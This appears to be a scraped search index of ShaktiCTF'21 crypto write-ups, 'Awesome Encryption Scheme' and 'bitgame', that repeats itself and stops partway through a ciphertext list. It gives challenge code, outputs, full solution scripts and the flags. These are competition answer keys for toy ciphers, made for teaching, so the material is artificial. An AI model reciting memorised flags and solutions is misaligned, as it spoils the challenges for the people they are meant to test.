bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] We can find the key used for AES-CFB by using L2, R2, L1(R0) : * Since R2 = L1 ^ E( R1 ) where E stands for CBC-Encryption -> R2 = L1 ^ E( R1 ) -> R2 ^ L1 = E( R1 ) -> R2 ^ R0 = E( L2 ) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CFB-key In detail: key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] Now we have the both key1 and key2 , so we can reverse the encryption process to decrypt the ciphertext. In detail: def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) Solution Script: from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) (iv1, iv2, ct),pt = (bytes.fromhex(i) for i in open('encrypted','rb').read().strip().decode().split(':')), b'finally now i am able to send my secret with double security and double trust, ' keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] keys = [ key1, key2] flag = decrypt(ct,iv1,iv2)[79:] print(flag) Flag: shaktictf{Well now I know that it is not an awesome encryption scheme}","title":"Awesome Encryption Scheme"},{"location":"ShaktiCTF21/crypto/AES/#awesome-encryption-scheme","text":"Authored by: Sowmya (@__4lpha__) Challenge Script: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from os import urandom from flag import flag keys = [md5(urandom(3)).digest() for _ in range(2)] def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def encrypt(m: bytes, iv1: bytes, iv2: bytes) -> bytes: m = pad(m,32) ciphers = get_ciphers(iv1, iv2) c = m for cipher in ciphers: c = b''.join(i[16:]+bytexor(i[:16],cipher.encrypt(i[16:])) for i in [c[i:i+32] for i in range(0,len(c),32)]) return c plaintext = f'finally now i am able to send my secret with double security and double trust, {flag}'.encode() iv1, iv2 = urandom(16),urandom(16) ciphertext = encrypt(plaintext, iv1, iv2) ciphertext = b\":\".join([x.hex().encode() for x in [iv1, iv2, ciphertext]]) open('encrypted','wb').write(ciphertext) Output: c486732c526c5b60bc29bae6926644eb:5fe355033095d413e601a7ede00fca1d:fd68e8732bb6e9b5672730eb1ed3f2fe9c88b5503e3fb08747ce3dd17296e383ccb76b78587bb1bd1337574073a185e9d846aeab36929d0101e433a34db0cf9ed034abb473a2280624d430c39e58c245603f56a4ddb1127a9f74051481440bbbe53fd95bc8a2a9a3f3488c68d1d9fa8e82cb40dce3df7b2d1c22fca0d05d08c9d197e053586643b32d3dbd4421996ad6abf2a1a930eb16609303471808bac90b This is a customised encryption scheme. So let's take a look at the block diagram to get better understanding of the encryption scheme. Enryption Block Diagram: Message-Block ---------------------------------------------------- | L0 | R0 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CBC |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Meet V ---------------------------------------------------- | L1 == R0 | L2 == R1 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CFB |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Cipher-Block V ---------------------------------------------------- | L2 | R2 | ---------------------------------------------------- Observation: If we notice the block diagram we can say that the encryption function is using two rounds of fiestal structure * Now we have L1||R1 * Key is a hash of 3 random bytes (can be bruteforced) We can find the key used for AES-CBC by using L0, R0, R1(L2) : * Since R1 = L0 ^ E( R0 ) where E stands for CBC-Encryption -> R1 = L0 ^ E( R0 ) -> R1 ^ L0 = E(R0) -> L2 ^ L0 = E(R0) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CBC-key In detail: keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] We can find the key used for AES-CFB by using L2, R2, L1(R0) : * Since R2 = L1 ^ E( R1 ) where E stands for CBC-Encryption -> R2 = L1 ^ E( R1 ) -> R2 ^ L1 = E( R1 ) -> R2 ^ R0 = E( L2 ) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CFB-key In detail: key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] Now we have the both key1 and key2 , so we can reverse the encryption process to decrypt the ciphertext. In detail: def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) Solution Script: from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) (iv1, iv2, ct),pt = (bytes.fromhex(i) for i in open('encrypted','rb').read().strip().decode().split(':')), b'finally now i am able to send my secret with double security and double trust, ' keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] keys = [ key1, key2] flag = decrypt(ct,iv1,iv2)[79:] print(flag) Flag: shaktictf{Well now I know that it is not an awesome encryption scheme}","title":"Awesome Encryption Scheme"},{"location":"ShaktiCTF21/crypto/bitgame/","text":"bitgame Authored by: Sowmya (@__4lph4__) We had a lot of fun conducting ShaktiCTF'21, a CTF conducted to encourage women into Cybersecurity. I created 4 challenges for the CTF and bitgame is one of them. Take a look at the challenge script for better understanding: from Crypto.Util.number import * import random from s3cr3t import flag, key def encrypt(m,pub_key): c = [] bin_msg = bin(bytes_to_long(m))[2:] n,y = key for i in bin_msg: x = random.getrandbits(100) if (i == '1'): c.append((y*pow(x,5,n))%n) else: c.append(pow(x,5,n)) return c ciphertext = encrypt(flag,key) f = open('ciphertext.txt','w') f.write(str(ciphertext)) #n = 839647959743379757835423741637185376972991646369 Output: [42562643920113780314383992973444790297800103805L, 270201072075946607048384842706374179998728033948L, 478696150572049854490380024972284640128204244133L, 192844167117548448623167075616273228287668196099L, 560792841716349679825902951279636180636145238250L, 609530546326083345244017170945258449548367476342L, 489678905487185887435192259665065793157044014172L, 304240005390453372970201668365849620502562510335L, 34740364038564867517367958320046869858974495288L, 354113555109471172653631381634279215113682434527L, 718863418577532883711655093137508949599751843969L, 787596421749282480717164478882637423554132800363L, 60720113008236309010337225519484549198276419459L, 375395201923408015626685085916186403723767481219L, 244943660867068328293332017974114669754460799950L, 245254377618599246752522270541215491846475305056L, 705460977796046179251314443682157178194595868596L, 643564235377169835300277024686733201282999002078L, 234607559505017773285254958409145178128337317081L, 262106729400567007422999522515963227780820148794L, 796797538124170595443577280466338638337631051917L, 671130571689483222411468470907489116985896909864L, 435111105901247188918896477824036572714870144108L, 188738259458513713348227390570323255976501894794L, 403664278827800051458795932069381383638039896912L, 450453923787928667025727490997218612598163453172L, 292277050504697818600132645594451578176163553728L, 396712586707424551591625597013523562315708771732L, 828540331627768530081785707127746956851775797537L, 306245019282101610448248764660903691388195345864L, 453025904791949452652850242819131133647931405938L, 498455466273080906354302937504490578475529510082L, 433859840721423539828281915899012036045501867638L, 4112471994028549942990159234057290220962191206L, 40112171061753634650048019681832930104362512193L, 506994066996892736157621420878132367834271023830L, 475973938071686707005969066843962965834158462383L, 483148946026593897799105539179028487395599456125L, 505268286307742621241742122018316818130514068358L, 51084013105707653358881704299907347959419162099L, 156674192162499653792974439867787206150121955892L, 116222523117951616298553926526606512146234488558L, 198838985683958200338238715473735852845718594403L, 552761077482623886613362536729637129504340314588L, 691926839330848205914573034974680099885594312359L, 533225574397822744447709196006479643432782746132L, 525069593329907206227192936432787959213477895494L, 574434273131566696574031958682215241461817125675L, 22971482101603880003567523316999669428901594086L, 415902134749361763242694778914875182215876697014L, 25481189327724499974328202975928332596342482407L, 806409749653502047630656641071162097281916027498L, 782739495150953778138488122166759366800784360878L, 94442051895289674789756899148894174046327631694L, 181641734203744708199456825173176266657123499807L, 60840903772324788098969124246794065320421213489L, 758393667796245465564567697624752663960576338728L, 6732911589183806346242718430982000627359130546L, 526538853135361065790441199485744413547707833102L, 13169452418822757462382920069838895938834788489L, 354264551159526034092752020219986483886957780091L, 763890973234725549738759266042572524218572268810L, 38915197197467524140953521263519944044015816676L, 356729012185507572094124074404303992692960763662L, 688935160710822672149080065664003093627178172074L, 390707470673135988461324074539218350756156234227L, 643234399905301583207285640240861813157651912695L, 206486526451835857688148677537562010548613380728L, 412547682212845496249004990275045182157219784000L, 586596463924160298483539472734795046471312794377L, 823573710837339354159625221299350410322401031709L, 699415995387530485085379798687393364287430406678L, 229385472079591809731148776566046688850677865912L, 409187618776725025866556179970352023362870372981L, 565122935290827580047237319222947875107451892822L, 793960543895031567094887608104418228949148881782L, 248282613526546833813841779078781073671096554161L, 184625905682457611988574304326798360600935828292L, 249163376695223358078209809278132837343403736414L, 346219945773967908894466481689718840158451686171L, 125348572697162313378337216926744739368205933652L, 360161339422686830433742299840394126403855057498L, 820661186304406524137071718374718559430977131504L, 271328514751805078696506404052237370921945990789L, 578924550192732328970864220370650951989184910362L, 790366482676934429301484856038963393930365397141L, 13174384137976706063457146620593936919423653154L, 669527535219694225761460923054950626237559513069L, 795644006931466412438436027675956386865843883078L, 94816506075556532038226354119900444345379903775L, 744956981517249057360969148911275811544442845027L, 559762794928370765077648338368130266624300230271L, 380155757610023881313542450314806157673664799112L, 19683776564375453605883964654879957698756254559L, 43383584999406070429416277350085499394109459126L, 144387263230719600281316819853134788477784762083L, 87949768501179906441288780703259946463864030018L, 431209645604478415485941369102530566991524490369L, 726222229627274684880162339685366010699968344905L, 112406592095148269917120485235753022005744988865L, 697437757471364977176040689280612791646014582160L, 288303739609623663737993183334403780500224944503L, 371441671537548617833261377684573395637718098377L, 73503179213393913023704937289223113070710436178L, 14278600014834517753559474524037832942635927659L, 95979312957862956641244586033112513755803077444L, 123611849060591463856666997035364759427112812349L, 250267505390780054373759212573794114332304420897L, 274331340187983766414970375369314382470309923528L, 530954278326398757599110590629998236194873705738L, 445063803639254844602118928332995402727991005526L, 477536316882356739806381795009989191971022494775L, 145806534277604580875808969952673951890456430994L, 338617094019005929131671762676393196161129291273L, 787986998792470243821397305866328174678704601832L, 797681956485293402755781130144373911193743174116L, 102568133699310747724426519505517138297342928702L, 485973235220253658819163335922664305614753222737L, 708864866282153909934399948843210933312918475225L, 308869644059764204860466118240550021785346378407L, 265134597784188972044817186771092475529959115280L, 658630862233825651846758771232193854753199783323L, 410299892119423701050427477155381392726923211285L, 6310556712134526086449137092667549852236480664L, 721490244153294996049060382571833870041784134677L, 189255620808066245253673434834382588149476325354L, 656660321216535035554868867584817446419376547800L, 227454614460719041137689443422767765867650838496L, 564044834979679073000283863743361202562615780677L, 819497725880056350642396338505462063661613081114L, 221608084786562734221253860081125113787049343286L, 65545019154510438233732307194863607751031185596L, 501764965357482269727888050687089193157839203155L, 12596049711442079696416208815415678242091492882L, 608335000655435283873776788164729624608624817344L, 769164412496263133567276017296030606229830101938L, 664392246067357098877579195261219487179986160723L, 75996028618380983622275289805057198859844565452L, 672253925254041921269524864028282672756772077887L, 10895374234330584911367787251440628566929185900L, 142938310359303082468235486875054184138048896491L, 580034759791051467570186991460531038900679165541L, 287969775416861410657459226277133443501613853261L, 283979020686970117242427425329619893769855354427L, 49347852309409910369201393348291141557656286601L, 624150486700256698789404049401551672419608893976L, 454233579238810112360216789636690941906069484L, 690476396562361518729054252655764072124449268089L, 364952245729150423326049996389508037748559889683L, 46898493332148283155094923745254689993163426686L, 721357617282368645994984755385188516191333854333L, 668358240156477324515019332670949254186522240400L, 530146560534258049207674282686131830473272127904L, 421240386903585887479293913607895739401770216131L, 131544157730297580532376112097192541317179941259L, 53769876913560242076228652083351431136553941165L, 324630132786079151774454244099857497319443044190L, 55914569733303855249647496460820458501426747612L, 356460015927961571935862199999992385930644898065L, 381970962369842965489276922281370450755149773458L, 377925988386382827724043815986127076122697666178L, 170391875451406681354914296500571079580495228122L, 500412216700342254882222529341044797546002378807L, 270482626136675206071126080144589222444978935258L, 510204515848361838813066544104229196649427634721L, 694801815446371547162777895975222045949858069418L, 739395372540171364253886631013817491306399454241L, 188905973397720824340314521621708188756348481623L, 487870658355564402820834450621197405413234278639L, 319933909357132234363354760423492914423939767405L, 263703052554121451143337156067968794709832976406L, 570885622346973806312331572767432345815012650994L, 613648216706507119609753855305736669966565489982L, 362055399017830857419118173194209585364129442109L, 464810998911591121288542168872550032794798575825L, 196427036821223400365200413058345761514591417071L, 25628609184402392719234409827173411591973261458L, 389660521648409036834014768969265025739038255604L, 384795004021400423555640099529367625348372390881L, 707289989717621963077194153935371259310016146498L, 670156226011236402401031750316704325477772529598L, 629478318010023990541972179492930924715945763382L, 420764775998999021307498556733386932841231547252L, 251295036637272900755099390296951302668662082535L, 169181615309865901082109507073231110967263343231L, 727702942882742898038421109217524091767497663579L, 83024833885016173065293040667506410015938527209L, 590299697981360913335337981554769685232278816484L, 839249169584760629344409812254395370637808942355L, 2532976737131698067709154159037178901016309877L, 827937908618358796220690459011146862691362111002L, 207856757362656702785928558342235732619155859448L, 769440512853837881195823544868309771285163168637L, 150792348186937950818307794770276348445131352633L, 406447664606606744239239241303236797113232638462L, 684929378565763960066686307141328078651822393408L, 224654949657621819479575791369530594184155735377L, 359668158337346821455429069306126150792495076312L, 426060019926904837328971794380434549817610220732L, 505900793827530726062521493253102791728579635544L, 574338323217068317021970616387654890577373082437L, 488642086812332277755648129901622844016014181036L, 782798139277588726443102861877502720631068154149L, 324941005837173666916146304702575016292154648894L, 599252796763371419729714377145026171271223602258L, 288626676593421098489763933781298880420148163084L, 467935558547944283971065855963398198551871488940L, 761714358296754159904539604281904852153669298518L, 276446988966064634125865380166049029609802351898L, 369023293814293814154164274667350587946664894323L, 717575431771607488393572799869825518074253493155L, 118574849771069306281658344868625779723252233598L, 12370452420955837433680686183877312882669690356L, 302301431161391687343955867699420163562587859945L, 195371671757690146983317782756160228746356628053L, 398747732493308984681571661499786666875939301584L, 698066685291591126425888078294753343383201876605L, 740615239592232339016993695884773933922478083470L, 106890365483452085129238401357149755728096568181L, 675424749894236876558905109629365681327887392939L, 201302679654677994076085404830210315546203833631L, 44180267617276864922134072223207783121823083760L, 124456735968311732522942481244765035866893530651L, 417097239834755904408684513793979044196227705274L, 233788505090359270398498540249276534994456393509L, 784883544295792169888524547442249976612414385390L, 263927032662315532641804497592590261948623275544L, 230408128635809022368695431658123209759525446197L, 828438163544123004635226007093619116738969501455L, 131177833362897071821531267320249645985720757061L, 282559114644612791250228142178864990076027445349L, 51535753100637770749762754865965551911906842650L, 75639553057595587596260623277885037750125179263L, 58473575929726038902167525004493155853338472174L, 644200156245117800830127150551293667263711884010L, 59336566770535954402402035001334688195109558183L, 325545043540004593614133895407411121346920176287L, 386730240555902975565127557492240699320716883276L, 107832757107482266991355321046790326277959386133L, 828353615833264639624534978723116154197590072611L, 437040243883858950708846625114604220964420978147L, 803398029066860857025331241486964965031131551855L, 576964537171426515123456361528143227570520116021L, 809583738378871906451344170063186991235371039023L, 823305093786540109619869220762083224118345164231L, 411621562624640152400201282326942360790677410663L, 231940523067486950068748404474658124358585742451L, 604140702068928167426636914613216363264491139925L, 182549530248750772516328059170083331367736115014L, 351272332765569839425323248007300819393087347081L, 808051965718020879122522501107824643411794084717L, 435313223797686028005157782836052182346489443562L, 773290097747317561689672554732697061093259735422L, 494807743119295726369579141007071491416325582655L, 374920928368387309057243128392752000439621200886L, 20308207759197365626061325015796899552114404367L, 219468272654429509419082815650800497195671108828L, 81139930848333886667752156803811140821451629059L, 569841453048534459795682040530849453115831698992L, 219815172001382756213076518296618693861215663555L, 315228832309928783802974983540753584930582247996L, 521351457638018908013070218723655643353193350239L, 837078355322582540009573068258668145024145790857L, 305949280410779965167795125684763760979096567656L, 752734535504843782529733381847990120498024803199L, 130979635848607595450001756874180120833056339272L, 127380462105684333862449267491349897546937670062L, 831464164576028236819157664155629321588853884506L, 458553646896923021292508986645409497433444903480L, 331547581789456197823262914448841887743389126588L, 687438850344432414366519941161325929797010982058L, 46814190784385113831609191671871870377062343969L, 367204250911005382086630700883675824898695572800L, 837950709225208622477048636848957743414279375406L, 755979086689398053301176627949234797669290978111L, 463929034563763591426239863240035335944307807918L, 388056079877348208051659258366423130180840108779L, 481802465454467461901032139782822670524640782774L, 701079443559078618728078108282845476374731501563L, 334745542222185197153180834408788144100538013756L, 253145560380270643162860828610515679311935720072L, 395630118318640218770711387893972244901063806635L, 208106342863019937023658673932614122363417212569L, 800934699010135610598225595151405276781918908874L, 696336112960889233518724992191716194527976985507L, 300286054927681941643313635323094504882574668063L, 458789329000502799100156566567758633503913820978L, 708175590579955723202930994812768283855064465047L, 587984734773590846183205937392451653174439236906L, 823762034931564176090815640023005894001280083927L, 524050296443714423381097945460586696978946512362L, 826146010460282803089280095111726046618296418403L, 738059115420803411392019151234924442822894137372L, 785923027603124246693527973036116119960741214026L, 252991902280292538077710740416727662292106903638L, 612730418549786530304086962840101299076730718334L, 69668983448626635123547735831825182040773807879L, 739161334792019562944848789255480347264595497250L, 426088326883952707470818191951397422806811512699L, 609894411725117311887748173369827266668614691266L, 165292756235797442318361854602140226544694739311L, 589667800107858677593289168022975113313550682848L, 640857564932560426034113458302923984027810983424L, 433295904246129548439611855874554726964056196739L, 295736828268442704674230280994652730936476162079L, 362750821004685893453136326523511170789437995781L, 589336117631319830914706810245178694288089137894L, 811399758747533046016039717227711274741061322838L, 27580861145202333471323495462147840357753419133L, 470227706417198698085667542317817787181959330535L, 584323275788057749480505550524460240732635160625L, 237827904233525417474165042101078126135986675291L, 185838249618402980174158400553291130995482918982L, 716717904900153456374864913024565035802728872046L, 299928293393029561935406197987330775735773835320L, 610584168172650199159224372380373439956634978704L, 690408099401618105598728398222166520124608190031L, 283306897206518288330461379029998212937266204548L, 817789019703352399202811822660012332372841442630L, 220127609791912011108106028754496869303560001849L, 246504269062014401534735358881601032162158759689L, 46082991319083955224175960690398710532164487906L, 212751399833511915627540175127168811177001660515L, 385250717564324096772476620548142926475688319557L, 61365581213548006550836975224755122334454850567L, 500463428035823554224310567250695080325995136096L, 61899143940365444140145428783315450062301530480L, 203025377470260666449657924180136421473514357156L, 123908476681846473673931773788947788317808065213L, 195215144275960912638932735284434043560100707418L, 133310257625037249927206630090100662665907910449L, 276367955374261543252723006408725695641217591135L, 663820798437396723050278496454824751706073882376L, 627376994406926072818386443662506537498856251729L, 807263912057381638138372982429348018327576023228L, 818554198814274015966753870605601199174333968563L, 529245620163810217622982543182351257311767464391L, 546398992629494812601212735149228626834119169658L, 788234766026477342751189473804919448998384347820L, 167271976519951808827353512125697808810338462380L, 430534784945777772222546078201421648977639348392L, 566978025835009408463135989978297395594607030631L, 727029425844280750981029116965799959144058594190L, 448139533138455217978527391597808802026293321469L, 151729712152759812390167470675728297857929105951L, 657791674324077339300884249739164923180072401180L, 424404948439217017610243837136383380191856871586L, 455777852150250746502732696760882431897002125490L, 118395806165479611207400242952156754708902219616L, 651998890970295878824168089404549122037582504955L, 318053786402730632110007904507392367956281607521L, 89256996994847882782731727353769430635891555271L, 191640633961245854939398057878203554179178922625L, 776093243824038694002940702752259227273873370266L, 604808053552832309560700585581226890424168461228L, 696457148711375718900956512475692076017562220382L, 225740711410466953926721086553814924866335860229L, 779384895686875556285208428413344125970531184120L, 80036196428413356900967644789298317424533638010L, 822496368697611448419908595847938425766407310386L, 834931499492006898642424172352707198872177553902L, 698414105277227047734122275193896168604649888702L, 529758554002809089081465457150468189507830589413L, 717258925424201058322126193594043182379350820121L, 545320778959010102117304312285631032420173177586L, 198810957950627600434822289656001469986862095348L, 396686025175354098156566844871532163846424230341L, 695402937231760183954791141361421552844300447983L, 616359789228266349699343794021003938187153822056L, 605577098887398262759634549331644256082166532624L, 601338707988632159208727568593686398013820974578L, 602334758345704224480697812073862084189082659829L, 199993895840217594422160437717413997273424537729L, 301172881601039569961892167965346000465469196938L, 270479627692150358469747722957892647453928511135L, 326335212710487507108472271822639699064648093691L, 106777921739243304370773085119576780949295942475L, 167071874552627084471353729657264563338026693956L, 197386913819707750998548688666241780705209642981L, 333989154944272765126437456969009498043248355518L, 434050250540343912275467215058298016032888176906L, 725401040393076792082841393446779306613460301273L, 727195206457435913302519991149583073712130944332L, 71590043050251237974379603651300783856190315391L, 793139264226788841507794442559678297202409093836L, 378525088022847526633162652098970409025974176857L, 64801404877308530110643631000410492805816851806L, 643972961663258149439837603423804897541649156072L, 157478292833194737519619595267874394324268309984L, 134041615706387295807480733390897871749463349268L, 461258613878623602622274059869770203247750228227L, 625872418231109115583561800171823884770612992316L, 237401566421194941434761956019939328673784029053L, 352405224268011659966413741974587740202212965590L, 116884396815801319245874245933296320636289143041L, 283195867540544834172532403440934521697373549015L, 689140484289234758370348531544928691906949176271L, 193196143026619464739760509606724898405753196236L, 67085710038260071732180539591066081368573964447L, 791794421731500760432508508849445876352096030071L, 432475128267108313460692996087695700599634295795L, 685073149783887985113269353340454247763263219124L, 335833908379012325847781848040473707739024530929L, 220612931303802409528417426553183475490460728373L, 291854819805074338140207394148645955031098744378L, 714515251507395673121930785122395634981321413798L, 724693143577584941911193410692637232099404458917L, 611243364076247112840263509691315114388391971369L, 229795860797995375715782537388782018888177477019L, 296341917462921514026327489596409707263895273191L, 309740425030881907897587814686626624055404447246L, 671631272527133996290893591609221360527257103885L, 218905811821960994832449103806857649781424376178L, 429772382896991457674660590568850053767362874075L, 250175727687874743892420590416583480995866963574L, 220396487416821216308222497372918137375558487785L, 248632603454655733234736595964105946950230116916L, 227496926861674027230311767436572791705586083714L, 519824104424885904393303337198605448578756909808L, 795103589371838503191297936262867047859443076904L, 244542828172213041199894799012547508435456165435L, 50052840614934527554894507145108176434868736721L, 539864968707154388655261925196382978215459738283L, 273582666961051735607824388845532732241288761719L, 531514886312313973773063924153516924192418657044L, 101484196383889500114457151515690119406749520478L, 404547795626034292311498435162286213193191412452L, 250171257240814875397420693184875445138996688633L, 211239841284623887225478944285253370693514862872L, 33702581727268200448000963472643896415286212021L, 727954030308555513888383002365701074524660686267L, 296372634680510180045698528854832499158025138767L, 103639178450743820451116640692980921644914754181L, 381056138816946574321553076345557659912184128071L, 220363775860108926430412133120609969043172885719L, 828380089804826191248904060499310291984337292267L, 240818837128375459115613365004393187326689178106L, 599714327776873507299886356592570412302353344127L, 514039904560736346483340269688580936191901954975L, 838405528426499141475985982949569190893885957871L, 67178744880390923276819786579857611880328181620L, 821336351518183360948635849459228489892497850605L, 465122017037822859400169939428274438908366165072L, 95264823246420773240792527458136208743710928871L, 158144519740001444337707734860202573635872827543L, 689985808396255471137327738486051869204812470986L, 550134662580703482270292485064392354509835320583L] Each bit is encrypted using unknown numbers, except the modulus. But, on checking the modulus, one can find that it is factorizable . Next step is to question if one can find which bit is being encrypted. For that, we need to check: pow(ct[i],phin//5,n) == 1 #this tells that the bit encrypted is 0 else 1 Solution Script: from Crypto.Util.number import * n = 839647959743379757835423741637185376972991646369 p,q = 716158806799958648435521, 1172432638921544069685089 f = open('ciphertext.txt').read() L = eval(f) #FYI: This is a dangerous function :P pt = \"\" for i in L: phi = (p-1)*(q-1) d = (phi*inverse(5,n))%n if (pow(i,d,n) == 1): pt = pt + '0' else: pt = pt + '1' print long_to_bytes(int(pt,2)) Flag: shaktictf{Awesome!!YouAreANumberTheoryExpert!!KeepGoing}","title":"bitgame"},{"location":"ShaktiCTF21/crypto/bitgame/#bitgame","text":"Authored by: Sowmya (@__4lph4__) We had a lot of fun conducting ShaktiCTF'21, a CTF conducted to encourage women into Cybersecurity. I created 4 challenges for the CTF and bitgame is one of them. Take a look at the challenge script for better understanding: from Crypto.Util.number import * import random from s3cr3t import flag, key def encrypt(m,pub_key): c = [] bin_msg = bin(bytes_to_long(m))[2:] n,y = key for i in bin_msg: x = random.getrandbits(100) if (i == '1'): c.append((y*pow(x,5,n))%n) else: c.append(pow(x,5,n)) return c ciphertext = encrypt(flag,key) f = open('ciphertext.txt','w') f.write(str(ciphertext)) #n = 839647959743379757835423741637185376972991646369 Output: [42562643920113780314383992973444790297800103805L, 270201072075946607048384842706374179998728033948L, 478696150572049854490380024972284640128204244133L, 192844167117548448623167075616273228287668196099L, 560792841716349679825902951279636180636145238250L, 609530546326083345244017170945258449548367476342L, 489678905487185887435192259665065793157044014172L, 304240005390453372970201668365849620502562510335L, 34740364038564867517367958320046869858974495288L, 354113555109471172653631381634279215113682434527L, 718863418577532883711655093137508949599751843969L, 787596421749282480717164478882637423554132800363L, 60720113008236309010337225519484549198276419459L, 375395201923408015626685085916186403723767481219L, 244943660867068328293332017974114669754460799950L, 245254377618599246752522270541215491846475305056L, 705460977796046179251314443682157178194595868596L, 643564235377169835300277024686733201282999002078L, 234607559505017773285254958409145178128337317081L, 262106729400567007422999522515963227780820148794L, 796797538124170595443577280466338638337631051917L, 671130571689483222411468470907489116985896909864L, 435111105901247188918896477824036572714870144108L, 188738259458513713348227390570323255976501894794L, 403664278827800051458795932069381383638039896912L, 450453923787928667025727490997218612598163453172L, 292277050504697818600132645594451578176163553728L, 396712586707424551591625597013523562315708771732L, 828540331627768530081785707127746956851775797537L, 306245019282101610448248764660903691388195345864L, 453025904791949452652850242819131133647931405938L, 498455466273080906354302937504490578475529510082L, 433859840721423539828281915899012036045501867638L, 4112471994028549942990159234057290220962191206L, 40112171061753634650048019681832930104362512193L, 506994066996892736157621420878132367834271023830L, 475973938071686707005969066843962965834158462383L, 483148946026593897799105539179028487395599456125L, 505268286307742621241742122018316818130514068358L, 51084013105707653358881704299907347959419162099L, 156674192162499653792974439867787206150121955892L, 116222523117951616298553926526606512146234488558L, 198838985683958200338238715473735852845718594403L, 552761077482623886613362536729637129504340314588L, 691926839330848205914573034974680099885594312359L, 533225574397822744447709196006479643432782746132L, 525069593329907206227192936432787959213477895494L, 574434273131566696574031958682215241461817125675L, 22971482101603880003567523316999669428901594086L, 415902134749361763242694778914875182215876697014L, 25481189327724499974328202975928332596342482407L, 806409749653502047630656641071162097281916027498L, 782739495150953778138488122166759366800784360878L, 94442051895289674789756899148894174046327631694L, 181641734203744708199456825173176266657123499807L, 60840903772324788098969124246794065320421213489L, 758393667796245465564567697624752663960576338728L, 6732911589183806346242718430982000627359130546L, 526538853135361065790441199485744413547707833102L, 13169452418822757462382920069838895938834788489L, 354264551159526034092752020219986483886957780091L, 763890973234725549738759266042572524218572268810L, 38915197197467524140953521263519944044015816676L, 356729012185507572094124074404303992692960763662L, 688935160710822672149080065664003093627178172074L, 390707470673135988461324074539218350756156234227L, 643234399905301583207285640240861813157651912695L, 206486526451835857688148677537562010548613380728L, 412547682212845496249004990275045182157219784000L, 586596463924160298483539472734795046471312794377L, 823573710837339354159625221299350410322401031709L, 699415995387530485085379798687393364287430406678L, 229385472079591809731148776566046688850677865912L, 409187618776725025866556179970352023362870372981L, 565122935290827580047237319222947875107451892822L, 793960543895031567094887608104418228949148881782L, 248282613526546833813841779078781073671096554161L, 184625905682457611988574304326798360600935828292L, 249163376695223358078209809278132837343403736414L, 346219945773967908894466481689718840158451686171L, 125348572697162313378337216926744739368205933652L, 360161339422686830433742299840394126403855057498L, 820661186304406524137071718374718559430977131504L, 271328514751805078696506404052237370921945990789L, 578924550192732328970864220370650951989184910362L, 790366482676934429301484856038963393930365397141L, 13174384137976706063457146620593936919423653154L, 669527535219694225761460923054950626237559513069L, 795644006931466412438436027675956386865843883078L, 94816506075556532038226354119900444345379903775L, 744956981517249057360969148911275811544442845027L, 559762794928370765077648338368130266624300230271L, 